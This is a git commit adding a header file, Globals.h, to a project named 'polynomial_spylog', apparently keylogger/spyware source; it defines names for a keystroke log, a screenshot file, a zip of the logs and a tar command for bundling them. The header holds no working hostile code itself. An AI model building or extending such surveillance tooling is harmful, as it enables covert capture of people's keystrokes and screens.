ff7dda020626c528d6fe109de6271f525450ca11
Ravijot singh <Ravijotsingh427@gmail.com>
2022-09-28 17:00:42 +0530

    Create Globals.h

---
+++ polynomial_spylog/Globals.h
@@ -0,0 +1,9 @@
+#ifndef __GLOBALS_H
+#define __GLOBALS_H
+
+#define LOG_FILE "keyLogs.log"
+#define IMG_FILE "screenshot.bmp"
+#define ZIP_FILE "logsZipFile.zip"
+#define ZIP_EXEC_CMD "tar.exe -a -c -f "
+
+#endif
